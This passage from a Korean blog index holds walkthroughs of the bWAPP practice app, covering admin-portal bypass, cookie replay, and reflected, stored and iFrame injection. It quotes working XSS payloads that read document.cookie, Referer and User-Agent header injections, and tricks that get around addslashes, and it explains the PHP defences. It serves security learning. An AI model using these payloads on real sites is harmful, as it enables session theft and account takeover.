확인하기 위해 0에서 1로 변경하여 서버에 요청하였다. 페이지의 잠금이 해제가 되었다는 출력 값이 나왔다. 관리자 페이지를 파라미터 값으로 관리하는 것이 매우 취약하였다. Medium 이번에는 쿠키로 관리를 하는 듯 하다.관리자 도구를 이용하여 확인하였다. Low에서 했던 것처럼 admin을 1로 변경하겠다. 잠금 해제 출력 값이 나왔다.옛날에 공유기의 관리자 사이트에서 쿠키값을 변경하면 로그인이 되었던 취약점이 있었다고 말했는데, 이걸 보니 그때 말해주었던 이야기가 생각이 난다. High 들어갔더니, 바로 잠금 해제가 되어있다.왜 그런가 했더니, DBA 권한를 가진 유저만 해제할 수 있도록 한 것으로 추측된다. 전에 만들었던 LRTK 계정으로 로그인하여 확인해보니 잠금이 걸어져 있었다. 이렇게 방어를 하면, DBA 권한을 가진 유저를 해킹하여 사이트로 들어가는 수 밖에 없으므로 좀 더 안전하다고 생각된다.","link":"/2021/02/07/Session-Mgmt-Administrative-Portals/"},{"title":"Session Mgmt - Cookies (HTTPOnly)","text":"HttpOnlyXSS 같은 공격으로 쿠키 탈취를 방지하기 위해, 자바스크립트의 document.cookie 함수를 사용하여 쿠키에 접근하는 것을 방지하는 옵션이다. Low 쿠키를 확인할 수 있도록 구현된 페이지인 것 같다. 위와 같이 ‘Cookies’ 버튼을 클릭 시 쿠키 및 관련 정보들이 테이블에 출력되며, here를 클릭 시 javascript의 alert창으로 쿠키 및 관련 정보를 출력하였다. 개발자 도구로 확인해보니, HttpOnly는 적용되어 있지 않다. 쿠키 탈취 예제를 위해 일반 크롬과 시크릿 모드 크롬 두 개를 키고, 하나는 bee 계정으로 로그인을 하고, 다른 하나는 다른 아이디로 로그인을 하여 bee 계정의 쿠키를 탈취했다는 가정하에 bee 계정의 쿠키를 이용하여 bee로 로그인을 시도하였다. 위와 같이 공격자가 쿠키를 탈취 시 쿠키를 이용하여 다른 계정으로 로그인을 할 수 있다. Medium이번에는 top_security의 값이 maybe이며, HttpOnly로 되어있다. 이 경우, javascript의 document.cookie에선 top_security이 출력이 안될 것이다. 만약 해커가 document.cookie 함수를 이용한 csrf 공격으로 다른 서버에 해당 사이트 계정의 쿠키값을 보낸다는 시나리오라면 top_security는 실패할 것이다. 해당 우회 방법은 XST(Cross Site Tracing)이 있는데, Trace 옵션이 켜져있을 때만 가능한 공격이다. HighHigh에선 Medium에선 1시간이였던 top_security의 사용 시간이 5분으로 줄었다. 다른 차이점은 없다.","link":"/2021/02/08/Session-Mgmt-Cookies-HTTPOnly/"},{"title":"Session Mgmt - Session ID in URL","text":"Low 세션 ID는 URL에 노출되면 안된다는 문구가 있다. 확인해보니, 파라미터 값으로 쿠키를 유출하고 있었다. Medium &amp; High 파라미터로 쿠키를 유출되는 것을 막았다.","link":"/2021/02/11/Session-Mgmt-Session-ID-in-URL/"},{"title":"XSS - Reflected (AJAX&#x2F;JSON)","text":"AJAXAjax는 비동기적인 웹 애플리케이션의 제작을 위해 아래와 같은 조합을 이용하는 웹 개발 기법 쉽게 말해 JavaScript를 사용한 비동기 통신, 클라이언트와 서버간에 XML 데이터를 주고받는 기술인데, 이를 이용하여 동적 웹 어플리케이션을 손쉽게 제작할 수 있었다. 문제풀이Low전에 풀었던 Xss 문제와 같은 형식이다.다른 점이라면, form에 데이터를 입력하면, 해당 데이터값을 서버에 보내서 다시 HTML을 받아오는 것이 아닌 AJAX를 이용하여 서버로 데이터를 보내고 응답값을 표시해준다. Xss 코드를 입력하기 앞서 Xss 코드에 들어가는 특수문자가 이스케이프가 되는지 확인하였다. ',&quot;은 확인을 안해보았지만, 될거 같아서 확인을 안하고 바로 Xss 공격을 시도하였다. Medium이번에도 Xss 공격에 사용되는 특수문자를 넣어서 확인해보았다. 입력해보니, &lt;,&gt;,'은 치환되지 않고 잘 되는 거 같은데 왠지는 모르겠지만, &quot;이 출력이 되지 않고 있다. 이벤트(onerror, onload 등)를 이용한 Xss 공격은 Low에서 해봤으니, script 태그를 입력하여 alert 창으로 쿠키를 출력해보겠다. 이상하게 스크립트 태그가 잘 들어갔지만, alert창이 안띄어졌다.검색을 해보니, 크롬에서 막고 있어서 출력이 안된다는 것이다. 그래서 AJAX가 어디로 값을 보내는지를 확인하여 이용하고자 코드를 살펴보았다. 123456789101112if(xmlHttp.readyState == 4 || xmlHttp.readyState == 0){ // Retrieves the movie title typed by the user on the form // title = document.getElementById(&quot;title&quot;).value; title = encodeURIComponent(document.getElementById(&quot;title&quot;).value); // Executes the 'xss_ajax_1-2.php' page from the server xmlHttp.open(&quot;GET&quot;, &quot;xss_ajax_2-2.php?title=&quot; + title, true); // Defines the method to handle server responses xmlHttp.onreadystatechange = handleServerResponse; // Makes the server request xmlHttp.send(null);} Get 메소드로 입력 데이터를 보내는 코드를 발견할 수 있었다.xss_ajax_2-2.php 페이지에 xss코드를 보내면 어떻게 작동하는지 테스트를 하였다. 예상은 했지만, xss_ajax_2-2.php에서 alert창을 출력하였다. High High에서는 htmlspecialchars 함수로 방어가 되어있다.","link":"/2021/02/13/XSS-Reflected-AJAX-JSON/"},{"title":"XSS - Reflected (AJAX&#x2F;XML)","text":"XMLEXtensible Markup Languag의 약자이며, HTML과 매우 비슷한 문자 기반의 마크업 언어이다.그러나 XML은 HTML처럼 데이터를 보여주는 목적이 아닌, 데이터를 저장하고 전달할 목적으로만 만들어졌다. 문제풀이Low 이전 문제인 AJAX/JSON과 같은 방식의 페이지이다. 이번에도 특수 문자를 넣어서 이스케이프가 되는지 확인하였다. 반응을 하지 않는다. 일단 알 수 없는 상항이니, 입력 데이터를 어디로 보내는지 확인을 하였다. 개발자 도구로 코드를 살펴보니, Head 부분에 xss_ajax_1.js이라는 JS파일을 불려오고 있었다.그래서 Source 칸에서 xss_ajax_1.js를 보니, xss_ajax_1-2.php?title=로 입력 데이터를 보내고 있었다. 이번엔 직접 입력 데이터를 보내서 어떻게 XML으로 생성되는지 확인을 하였다. 처음 특수문자가 이스케이프가 되는지 안되는지 확인하기 위한 값이 에러가 나서 페이지에서 파싱을 못해 동작하지 못했던 것이였다. 이번에 xss_ajax_1-2.php에 a태그를 넣어서 에러가 나는지 확인을 하였다. 에러가 나타나지 않고 잘 나오는 것을 확인할 수 있었다. 그럼 이번에 결과값이 페이지에 잘 반영이 되는지 확인하였다. 왜 그런가 했더니, a 태그가 XML의 태그로 잡혀서 반영이 안된 것이다. 검색을 하니, 특수 문자를 HTML 특수문자 코드로 변경하여 넘겨주면 XML에서 문자열로 읽을 것이고 그걸 그대로 HTML에 넘기면 HTML은 태그로 알아듣는 다는 것을 알 수 있었다. Get은 입력값을 url 인코딩을 하여 보내기 때문에 HTML 특수문자 코드를 url 인코딩을 하여 서버로 전달해야한다. &lt;a&gt;hi&lt;/a&gt; - &amp;lt;a&amp;gt;hi&amp;lt;/a&amp;gt; - %26lt%3ba%26gt%3bhi%26lt%3b%2fa%26gt%3b url 인코딩된 값을 xss_ajax_1-2.php에 보내줬다. a태그가 XML에 태그로 잡히지 않고, 문자열로 잡힌 것을 볼 수 있었다.이제 XML 파싱 JS 코드인 xss_ajax_1.js가 파싱을 하면, 브라우저에선 a태그를 태그로 보고 처리를 할 것이다. 반영이 잘 된 것을 알 수 있다.JS로 alert창을 띄우는 것은 브라우저에서 막고 있으니, img 태그를 이용하여 xss을 시도하였다. Medium addslashes 함수로 이스케이프되어 있다. High htmlspecialchars 함수로 특수 문자를 HTML의 특수문자 코드로 이스케이프하였다.","link":"/2021/02/14/XSS-Reflected-AJAX-XML/"},{"title":"XSS - Reflected (Back Button)","text":"문제풀이Low 1&lt;input type=&quot;button&quot; value=&quot;Go back&quot; onclick=&quot;document.location.href='http://xxx.xxx.xxx.xxx:xxx/portal.php'&quot;&gt; Go back 버튼을 클릭 시 portal.php로 돌아감. 자세한 흐름을 알기 위해 해당 문제의 페이지로 Request를 하는 것을 burp suit를 이용하여 살펴보았다. 1234567891011GET /xss_back_button.php HTTP/1.1Host: xxx.xxx.xxx.xxx:xxxCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://xxx.xxx.xxx.xxx:xxx/portal.phpAccept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=2f9fqpk49iaolf6eqav1i3m7b2; security_level=0Connection: close 살펴보니 Referer라는 부분이 있었다.Referer 해더는 현재 요청된 페이지의 링크 이전의 웹 페이지 주소를 포함하는 헤더이다. 이를 수정하여 alert창을 띄우도록 하겠다. 1Referer: ';alert(1);' 해당 Referer는 Onclick에 들어가기 때문에 script 태그 사용을 안해도 된다. 1&lt;input type=&quot;button&quot; value=&quot;Go back&quot; onclick=&quot;document.location.href='';alert(1);''&quot;&gt; Referer의 변조가 성공하였다. MediumLow 레벨의 방법대로 했더니, 1&lt;input type=&quot;button&quot; value=&quot;Go back&quot; onclick=&quot;document.location.href='\\'hihihi\\''&quot;&gt; '가 이스케이프가 되었음. 아마 addslashes 함수로 처리했을거라 판단이 됨.그럼 ',&quot;,\\,NUL은 Xss에 사용이 불가능하다. addslashes 함수를 우회하기 위해 HTML entity Encoding를 사용하였다. 1Referer: &amp;#039;;alert(document.cookie);&amp;#039; 1&lt;input type=&quot;button&quot; value=&quot;Go back&quot; onclick=&quot;document.location.href='';alert(document.cookie);''&quot;&gt; Xss 성공함. HighMedium 레벨와 같은 방식으로 시도하였지만, 실패함. 1&lt;input type=&quot;button&quot; value=&quot;Go back&quot; onclick=&quot;document.location.href='&amp;amp;#039;;alert(document.cookie);&amp;amp;#039;'&quot;&gt; htmlspecialchars 함수로 Referer 값을 이스케이프 했기 때문에 &amp;의 값이 HTML 엔티티로 변경되어 Xss이 실패함.","link":"/2021/02/15/XSS-Reflected-Back-Button/"},{"title":"XSS - Reflected (Custom Header)","text":"문제풀이Low 문제 페이지를 보니, bWAPP 헤더를 사용한다고 한다. Burp Suit를 이용하여 bWAPP 헤더를 추가하여 서버에 보내겠다. Repeater의 기능으로 확인해보니, bWAPP 헤더에 입력한 값이 그대로 출력되는 것을 볼 수 있었다. bWAPP 헤더에 Xss 코드를 넣어서 alert창으로 쿠키를 출력하였다. Medium Low 레벨과 달리 addslashes 함수로 bWAPP 헤더의 값을 이스케이프 처리를 하였다. 이번엔 HTML 엔티티로 우회가 안되니, 태그 속성에 '과 &quot;를 넣지 않으면 자동으로 &quot;이 생기는 점을 이용하여 ', &quot;을 사용하지 않고 img 태그로 Xss를 시도하겠다. XSS - Reflected (Back Button) 문제에선 on 이벤트 안에 데이터가 있어서 입력된 값이 문자열 처리가 된다. 이를 이용하여 HTML 엔티티로 값을 보내서 HTML가 엔티티를 디코딩했을 시 문자로 되니, on 이벤트가 실행이 된다. 위의 예시는 설명한 것을 테스트해본 것이다. High htmlspecialchars 함수에 인하여 Xss에 사용하는 특수문자가 이스케이프되는 것을 알 수 있다.","link":"/2021/02/16/XSS-Reflected-Custom-Header/"},{"title":"XSS - Reflected (Eval)","text":"Eval 함수eval()은 문자로 표현된 JavaScript 코드를 실행하는 함수이다. 문제풀이Low URI의 파라미터 값을 보니 Data()라는 값을 보내주고 있는데 문제의 제목상 자바스크립트의 Data() 함수가 Eval에 문자열로 넘어진 것으로 판단이 된다. 1234567891011121314151617&lt;div id=&quot;main&quot;&gt; &lt;h1&gt;XSS - Reflected (Eval)&lt;/h1&gt; &lt;p&gt;The current date on your computer is:&lt;/p&gt; &lt;p&gt; &lt;script&gt; eval(&quot;document.write(Date())&quot;); &lt;/script&gt;Thu Feb 18 2021 22:04:50 GMT+0900 (대한민국 표준시) &lt;/p&gt; &lt;/div&gt; 혹시 몰라 페이지의 코드를 보니, 페이지의 코드 내 자바스크립트에 값을 넣어 준 것을 볼 수 있었다. 이를 이용하여 Cookie 값을 페이지에 출력하였다. 추가적으로 SQL Injection에서 사용하는 패턴으로 주석처리를 넣어서 alert창까지 띄어 보았다. Medium 파라미터에 대한 처리가 있는지 Low에서 작동하였던 함수들이 실행이 안됐다. 1234567891011121314151617&lt;div id=&quot;main&quot;&gt; &lt;h1&gt;XSS - Reflected (Eval)&lt;/h1&gt; &lt;p&gt;The current date on your computer is:&lt;/p&gt; &lt;p&gt; &lt;script&gt; eval(&quot;document.write(document.cookie)&amp;quot;);eval(&amp;quot;alert(1);&amp;quot;)//)&quot;); &lt;/script&gt; &lt;/p&gt; &lt;/div&gt; 코드를 보니 &quot;가 HTML 엔티티로 이스케이프가 된 것을 확인 할 수 있었다. 아마 개발자가 화이트 리스트로 특수 문자를 지정하여 이스케이프를 했거나, htmlspacialchars() 함수를 사용하여 이스케이프 처리를 한 것으로 판단이 된다. 확인을 위해 htmlspacialchars() 함수가 이스케이프하는 특수 문자들을 넣어봤다. 12345&lt;script&gt; eval(&quot;document.write(&amp;#039;&amp;quot;&amp;lt;&amp;gt;)&quot;);&lt;/script&gt; 모두 HTML 엔티티로 이스케이프 처리가 되었다. 100% 확신 할 수 없지만, 특수문자를 배제하고 JS함수만을 이용하겠다. Low에서 사용하였던 document.cookie을 이용하여 쿠키를 출력하였다. 특수문자를 이스케이스 처리하는 것 만으로는 방어가 안된다는 것을 볼 수 있다. High 위에 나온 방법대로 모두 넣어봤지만, 실패하였다. 아마 파라미터 값이 Data()가 아니면, 실패값이 출력하도록 코딩이 되어 있는 것으로 판단된다. Source Code1234567891011case &quot;0&quot; : $data = no_check($data); break;case &quot;1&quot; : $data = xss_check_3($data); break;default : $data = no_check($data); break; Low와 High는 파라미터 값을 그대로 받아왔다. Medium은 예상했던 것처럼 htmlspacialchars() 함수를 거치고 넘어오는 것을 확인 할 수 있었다. 12345if(isset($_GET[&quot;date&quot;])){ if($_COOKIE[&quot;security_level&quot;] == &quot;2&quot;){ if($_GET[&quot;date&quot;] != &quot;Date()&quot;){ echo &quot;&lt;p&gt;&lt;font color=\\&quot;red\\&quot;&gt;Invalid input detected!&lt;/font&gt;&lt;/p&gt;&quot;; } High에서는 파라미터 값이 Date()가 아니면 실패코드를 출력하게 조건문으로 처리하였다.","link":"/2021/02/18/XSS-Reflected-Eval/"},{"title":"XSS - Reflected (GET)","text":"XssCross Site Scripting의 약자로, 해커가 사용자의 브라우저 내에서 악성 Javascript를 실행하는 취약점이다. 현재의 Javascript는 웹상에서 없어선 안되는 존재입니다.JavaScript가 피해자의 브라우저 페이지에서 실행되기 때문에 인증 된 사용자에 대한 민감한 세부 정보가 세션에서 도용 될 수 있으며, 본질적으로 악의적 인 행위자가 사이트 관리자를 표적으로 삼아 웹 사이트를 완전히 손상시킬 수 있습니다. Xss 공격 유형Stored (Persistent) Cross-Site Scripting공격자의 페이로드(악성 Javascript)를 서버에 저장하여 웹사이트가 다른 방문자에게 페이로드를 전달하는 공격 Reflected Cross-Site Scripting브라우저에서 서버로 전송된 공격자의 페이로드가 페이지에 반영이 될 때 발생되는 공격 Self Cross-Site Scripting매우 구체적인 컨텍스트 및 수동 변경이 필요한 취약점을 악용할 때 발생되는 공격이라고 정의가 되어있는데,나는 쉽게 생각해서, 악성 Javascript가 나한테만 일어나는 것이 Self Xss이라고 생각한다. 예제로, LRTK 블로그 BeeBox의 첫 문제풀이인 HTML Injection을 예제로 생각한다.내가 입력한 값이 서버에 저장이 안되어, 다른 사용자들에게 피해를 입히지 못하는 것이 Self Xss의 예시라 생각한다. Blind Cross-Site Scripting공격자가 공격의 결과를 볼 수 없는 공격이러한 취약점은 일반적으로 권한이 있는 사용자만 액세스 할 수 있는 페이지에서 진행될 경우가 많다. Dom-Based Cross-Site Scripting이 공격은 서버 자체가 Xss에 취약한 것이 아닌 페이지의 Javascript가 취약할 때 발생되는 공격이다. 문제풀이Low 이와 같이 First/Last name을 입력하여 서버에 넘겨주면, 서버는 입력된 값을 form 밑에 Welcome ‘first name’ ‘last name’으로 반영하여 다시 브라우저에 넘겨준다. 이를 이용하여 Javascript를 이용하여 쿠키를 alert 창으로 띄워 보겠다. first name : &lt;script&gt;alert(document.cookie)&lt;/script&gt;last name : aaaa 이 Xss은 페이지에서 자바스크립트를 그대로 반영하여 일어난 거지만, 관리자/다른 사용자들은 전혀 공격 대상으로 삼을 수 없으니, Self Xss로 봐도 무방하다. Low 레벨에선 태그와 Javascript의 함수 등을 예외처리을 안하고 그대로 반영을 하여 Xss가 일어난 것으로 판단된다. MediumLow 문제와 똑같이 Javascript를 시도하였는데 그대로 반영이 되어 Xss가 일어났다.분명 Low와 달리 Xss 방어를 했을거라 생각이 들어 다른 방법으로 시도하였다. svg 파일을 불려오는데 만약 error가 생기면 Javascript가 발생되는 Xss 코드를 입력하였다.first name : &lt;svg src='#' onerror='alert(document.cookie)' /&gt;last name : aaaa 어떻게 방어를 했는지 보기 위해 개발자 도구를 이용하여 해당 Xss 코드를 살펴보았다. &lt;svg src=&quot;\\'#\\'&quot; onerror=&quot;\\'alert(document.cookie)\\'&quot;&gt;&lt;/svg&gt;서버에서 입력 받은 데이터가 예외처리를 받아 Xss 코드가 변경이 되었다. 차이점이라면, '이 변경이 된 것 같다.정확한 확인을 위해 first name에 'a'를 입력하여 확인하였다. 변경 된 것을 확인 할 수 있었다. Source Code 코드를 분석하니, 입력 받은 데이터는 addslashes 함수에 넣어지고 있었다. addslashes 함수문자열에 ', &quot;, \\, NUL의 문자가 있으면 해당 문자 앞에 \\를 추가하여 이스케이프하여 반환하는 함수이다. High 위 Low, Medium Level에서 사용하였던 Xss 코드로 시도하였지만, Javascript로 반영되지 않고 문자열로 취급받아 반영되었다. Source Code htmlspecialchars 함수HTML에서 특별한 의미를 가진 특정 문자(&amp;, &quot;, ', &lt;, &gt;)을 HTML 엔티티로 이스케이프하여 반환하는 함수이다.","link":"/2021/02/12/XSS-Reflected-GET/"},{"title":"XSS - Reflected (HREF)","text":"문제풀이Low문제 제목 밑에 있는 글을 해석하니, “좋아하는 영화에 투표하려면 이름을 입력해야 합니다.” 라는 글이 있었다. 문제를 풀기 전 어떻게 작동하는지 확인하겠다. LRTK를 입력 후 Continue 버튼을 누르니, 파라미터로 name=LRTK, action=vote를 가지고 xss_href-2.php로 이동한다. xss_href-2 페이지의 문제 제목 밑 글을 해석하니, “안녕하세요 LRTK, 좋아하는 영화에 투표 해주세요.기억하세요, Tony Stark는 매번 이기고 싶어합니다 …” 라는 글을 볼 수 있었다. Iron Man에 투표를 하니, xss_href-3.php 내가 입력한 값은 xss_href-2.php에 페이지에 반영이 되니, 주 타겟으로 잡고 Xss를 시도하겠다. 일단 a태그를 넣어서 입력한 값이 HTML에 태그로 반영이 되는지 확인하였다. 문제 제목 밑 글에선 p태그로 인하여 입력한 a태그가 문자로 잡히는 것을 알 수 있었다. 하지만 입력값은 문제 제목 밑 글에서만 반영되는 것이 아니다. xss_href-3.php의 파라미터를 보면 name의 값으로 입력값을 보냈는 것을 볼 수 있다. 즉, xss_href-3.php로 가는 href의 값에 입력값으로 태그를 넣을 수 있다는 것이다. 코드를 보니 입력값이 어떻게 들어가는지를 확인할 수 있었다. a태그를 먼저 끝내고, Xss를 시도하겠다. Xss이 성공한 것을 볼 수 있다. Medium &amp; High 입력값이 URL 인코딩으로 처리가 된 것을 볼 수 있다. Code1234567891011121314151617181920function hpp($data){ switch($_COOKIE[&quot;security_level&quot;]){ case &quot;0&quot; : $data = no_check($data); break; case &quot;1&quot; : $data = urlencode($data); break; case &quot;2&quot; : $data = urlencode($data); break; default : $data = no_check($data); break; } return $data;} Medium과 High을 코드를 보니, urlencode 함수에 입력값을 넣어주는 것을 알 수 있었다.","link":"/2021/02/19/XSS-Reflected-HREF/"},{"title":"XSS - Reflected (JSON)","text":"문제풀이Low 우리의 마스터가 마블 영화를 엄청 좋아한다는 힌트가 써져있다.저번 문제에서 계속 아이언맨이 있었으니, 아이언맨을 입력해 보았다. 이번엔 이상한 값을 입력해 보았다. 아직까진 어떻게 작동하는지 잘 모르겠다.개발자 도구를 열어서 Json을 확인하였다. 입력한 값이 ??? 앞에 들어가는 것을 확인할 수 있었다.현재 저 Json은 자바스크립트로 묶어져 있는 코드들이다. 만약 입력값이 JS를 넣는다면 어떻게 되는지 확인해봤다. input : &lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 원래의 JS가 한참 밑에도 있어야 하지만, 입력에 를 넣어 끊어버렸다.그리고 새로운 JS를 넣어서 alert 함수를 실행하였다. Medium &amp; High htmlspecialchars 함수에 의해서 특수 문자가 HTML 엔티티로 이스케이프되면서 문자열로 출력되고 있다.","link":"/2021/02/12/XSS-Reflected-JSON/"},{"title":"XSS - Reflected (Login Form)","text":"문제풀이Low 로그인을 해야하지만, bee 계정과 LRTK 계정으로 로그인이 안된다. 현 로그인의 계정 정보도 없어서, SQL Injection이 되는 지 확인을 해보았다. SQL의 에러메시지가 그대로 출력되는 것을 확인할 수 있었다. 이것을 이용하여 입력한 XSS 코드가 페이지에 반영할 수 있을 것 같다. 먼저 a태그를 넣어서 반영이 되는지 확인을 했는데 반영이 되는 것을 볼 수 있었다. SQL 에러 메시지 출력을 막으면 될 거 같은데 Medium과 High에서 방어 방법을 알아 보겠다. Medium &amp; High SQL 에러가 더이상 출력이 안된다. 더이상 XSS은 시도할 수 없을 것 같다. Code1234567891011121314151617switch($_COOKIE[&quot;security_level&quot;]){ case &quot;0&quot; : $data = no_check($data); break; case &quot;1&quot; : $data = sqli_check_1($data); break; case &quot;2&quot; : $data = sqli_check_2($data); break; default : $data = no_check($data); break;} sqli_check_1123function sqli_check_1($data){ return addslashes($data);} addslashes 함수로 특정 특수 문자 앞에 \\을 넣어서 이스케이프하였다. sqli_check_2123function sqli_check_2($data){ return mysql_real_escape_string($data);} mysql_real_escape_string 함수를 이용하여 SQL에 사용되는 특수 문자 앞에 \\을 넣어서 이스케이프 처리하였다.","link":"/2021/02/23/XSS-Reflected-Login-Form/"},{"title":"XSS - Reflected (Referer)","text":"문제풀이XSS - Reflected (Back Button)과 같은 문제라고 봐도 되는 문제이다. Referer 헤더를 참고하여 페이지에 반영하는 사이트이다. 프록시를 이용하여 Referer 헤더에 XSS 코드를 삽입하면, 페이지에선 그대로 반영을 해 줄 것이다. 1234567891011GET /xss_referer.php HTTP/1.1Host: XXX.XXX.XXX.XXXCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Referer: &lt;img src=# onerror=alert(1)&gt;Cookie: PHPSESSID=qnpb44sfr6u9ofp3pni8vobuf5; security_level=0Connection: close Medium ', &quot;, \\의 앞에 \\가 추가되어 이스케이프가 된 것을 보아 addslashes 함수에 의해 입력값이 이스케이프가 된다는 것을 알 수 있다. 이를 우회하기 위해 Low Level에서 사용한 XSS코드처럼 ', &quot;를 사용하지 않고 XSS를 실행하면 된다. High 입력값의 특수 문자가 HTML 엔티티로 이스케이프가 되어 XSS 코드가 그대로 출력되는 모습이다.","link":"/2021/02/25/XSS-Reflected-Referer/"},{"title":"XSS - Reflected (User-Agent)","text":"User-Agent사용자 에이전트 요청 헤더는 서버와 네트워크 피어가 요청하는 응용 프로그램, 운영 체제, 공급 업체 및 / 또는 버전을 식별 할 수있는 특성 문자열 사용자 에이전트 문제풀이LowXSS - Reflected (Referer) 문제와 똑같은 문제이다. 차이점이라면, Referer 헤더가 아닌 User-Agent 헤더를 이용하는 것이다. 바로 User-Agent을 프록시를 이용하여 XSS 코드를 삽입하여 페이지에 반영하겠다. Medium', &quot;, \\의 앞에 \\이 추가되어 이스케이프가 된 것을 볼 수 있었다. addslashed 함수로 입력값을 이스케이프를 한 것으로 보인다. 해당 우회방법은 Low 방법대로 ', &quot;, \\를 사용 안하는 방법이 있다. High htmlspecialchars 함수에 의해 특수 문자가 HTML 엔티티로 이스케이프되어 그대로 출력되는 것을 볼 수 있다.","link":"/2021/02/27/XSS-Reflected-User-Agent/"},{"title":"XSS - Stored (Blog)","text":"문제풀이Low form에 글에 입력하고 Submit 버튼을 클릭하면, 해당 글이 DB에 저장이 된다. 그리고 페이지는 DB에서 저장된 글을 가져와서 페이지로 반영을 한다. 이를 이용하여 XSS 코드를 DB에 저장하여 페이지에 반영하겠다. Medium addslashes 함수로 DB에서 불려온 값의 ', &quot;, \\가 이스케이프 되는 것을 볼 수 있다. addslashes 함수를 우회하는 방법은 Low에서 사용한 XSS 코드처럼 ', &quot;, \\을 사용하지 않고 XSS을 시도하면 된다. High htmlspecialchars 함수로 특수문자가 HTML 엔티티로 이스케이프되면서 그대로 출력되는 모습을 볼 수 있다.","link":"/2021/02/27/XSS-Stored-Blog/"},{"title":"iFrame Injection","text":"LowbWAPP/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250 Url를 보면 robots.txt을 iFrame에 넣어서 출력한다.ParamUrl을 robots.txt말고 다른 링크을 넣으면 출력이 되는지 확인하였다. bWAPP/iframei.php?ParamUrl=index.php&amp;ParamWidth=250&amp;ParamHeight=250 출력이 되는 모습을 볼 수 있다.여기서는 아무 악성 행위가 없는 사이트를 넣어지만, 만약 Xss가 들어있는 사이트를 넣으면 공격을 시도 할 수도 있다. 소스 코드를 확인하면, 바로 url를 출력하는 것을 확인 할 수 있다. 123function no_check($data){ return $data;} Medium물론 안되겠지만, Low처럼 index.php를 불려오도록 하겠다.bWAPP/iframei.php?ParamUrl=index.php&amp;ParamWidth=250&amp;ParamHeight=250 역시 보완이 되었는지 index.php가 출력이 안된 것을 확인할 수 있다.Url의 파라미터를 확인해보니, iframe의 옵션으로 확인 할 수 있다. 이것들을 이용한다면, Xss나 iFrame Injection이 가능할 것 같다.이를 위해, 개발자 도구를 이용하여 해당 파라미터가 어떻게 넣어지는지를 확인하였다. Url의 파라미터에 아무 값을 안 넣고 소스 코드를 확인하였을 때의 모습이다.bWAPP/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250 1&lt;iframe frameborder=&quot;0&quot; src=&quot;robots.txt&quot; height=&quot;250&quot; width=&quot;250&quot;&gt;&lt;/iframe&gt; 가장 마지막 파라미터에 test를 입력하여 소스 코드를 확인하였다.bWAPP/iframei.php?ParamUrl=test&amp;ParamWidth=test1&amp;ParamHeight=test2 1&lt;iframe frameborder=&quot;0&quot; src=&quot;robots.txt&quot; height=&quot;test2&quot; width=&quot;test1&quot;&gt;&lt;/iframe&gt; src는 robots.txt가 고정으로 확인되었다. 아마 다른 링크를 넣는 것을 방지하기 위함으로 추측이 된다.하지만, 다른 파라미터는 값을 넣을 수 있다. 이를 이용하여 iFrame Injection하겠다. ParamWidth에 &quot;&gt;&lt;/iframe&gt;&lt;iframe src='index.php' height=&quot;250&quot; width=&quot;250&quot;&gt;&lt;/iframe&gt;을 추가하여 Injection을 시도하겠다. 1&lt;iframe frameborder=&quot;0&quot; src=&quot;robots.txt&quot; height=&quot;250&quot; width=&quot;250&quot;&gt;&lt;/iframe&gt; 전혀 변경된 것이 없다. 생각을 하면, &lt;, &gt;, /을 지웠다면, 지워진 나머지 문자열은 남아있어야 하는데 전혀 볼 수가 없다.그래서 ParamWidth와 ParamHeight에 &lt;/test&gt;을 넣어서 확인해봤다. bWAPP/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&quot;&lt;/test&gt;&amp;ParamHeight=250&quot;&lt;/test&gt; 1&lt;iframe frameborder=&quot;0&quot; src=&quot;robots.txt&quot; height=&quot;250\\&quot; &lt;=&quot;&quot; test=&quot;&quot;&gt;&quot; width=&quot;250\\&quot;&lt;/test&gt;&quot;&gt;&lt;/iframe&gt; 뭔가 이상하게 되었다. 하지만, ParamWidth에 넣었을 때와 다르게 소스코드에 넣어졌기 때문에 다시 한번 ParamWidth에 넣었던 &quot;&gt;&lt;/iframe&gt;&lt;iframe src='index.php' height=&quot;250&quot; width=&quot;250&quot;&gt;&lt;/iframe&gt;을 넣어서 시도하였다. bWAPP/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250&quot;&gt;&lt;/iframe&gt;&lt;iframe src='index.php' height=&quot;250&quot; width=&quot;250&quot;&gt;&lt;/iframe&gt; 12&lt;iframe frameborder=&quot;0&quot; src=&quot;robots.txt&quot; height=&quot;250\\&quot;&gt;&lt;/iframe&gt;&lt;iframe src=&quot;\\'index.php\\'&quot; height=&quot;\\&amp;quot;250\\&amp;quot;&quot; width=&quot;\\&amp;quot;250\\&amp;quot;&quot;&gt;&lt;/iframe&gt; iframe Injection이 성공한 것을 확인할 수 있다. 이제 어떻게 iframe Injection을 방어했는지 소스 코드를 확인하겠다. Source Code1234567function xss_check_4($data){ // addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc. // These characters are single quote ('), double quote (&quot;), backslash (\\) and NUL (the NULL byte). // Do NOT use this for XSS or HTML validations!!! return addslashes($data);} addslashes 함수를 사용하여 유효성 검사를 하였다. addslashes 함수Link : http://www.w3big.com/ko/php/func-string-addslashes.html addslashes 함수는 데이터베이스에 특수 문자를 넣을 경우 예상치 못한 오류를 발생하는 것을 치환하여 방지하는 함수이다. [ 치환되는 문자 ] ‘ “ \\ NULL 이 문자들은 출력이 될 때 앞에 \\이 붙는다. 소스 코드의 주석을 보면 Xss과 HTML의 유효성 검사로는 